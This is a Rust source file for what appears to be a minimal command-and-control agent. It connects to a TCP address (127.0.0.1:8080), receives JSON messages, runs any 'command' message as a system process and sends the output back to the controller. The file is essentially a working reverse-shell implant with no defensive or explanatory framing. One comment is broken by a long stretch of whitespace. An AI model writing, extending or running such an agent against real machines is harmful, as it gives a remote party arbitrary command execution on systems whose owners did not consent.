use tokio::net::TcpStream;
use tokio::io::{AsyncReadExt,AsyncWriteExt};
use tokio::process::Command;
use std::process::Stdio;
use serde_json::Result;
mod comm;



#[tokio::main]
async fn main() {
    // Buff for socket
    let mut buff = [0;1024];
    // Tokio create connection
    let mut stream: tokio::net::TcpStream = TcpStream::connect("127.0.0.1:8080").await.unwrap();

    // Keep accepting data and do st                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           uff with is
    loop{
        let n: usize = stream.read(&mut buff).await.unwrap();
        
        // Convert JSON to struct
        let my_data: comm::MyProto = serde_json::from_str(std::str::from_utf8( &mut buff[..n]).unwrap()).unwrap();
        

        // Message type is command so run the command
        match my_data.message_type.as_str() { 

            "command" => {
                let command: Vec<&str> = my_data.data.split(" ").collect();
                // Get command output
                let command_output: std::process::Output = Command::new(command[0]).args(command.iter().skip(1)).output().await.unwrap();
                // Create object using output
                let output_data: comm::MyProto = comm::MyProto{
                    data: std::str::from_utf8(&command_output.stdout).unwrap().to_string(),
                    message_type: "command output".to_string(),
                    channel: "1".to_string()
                };
                
                // Send it back
                stream.write(serde_json::to_string(&output_data).unwrap().as_bytes()).await.unwrap();
            },
            _ => {
                let output_data: comm::MyProto = comm::MyProto{
                data: "Error: Unknown message_type".to_string(),
                message_type: "Error".to_string(),
                channel: "1".to_string()}; 
                stream.write(serde_json::to_string(&output_data).unwrap().as_bytes()).await.unwrap();
        
                }
            };
        }
}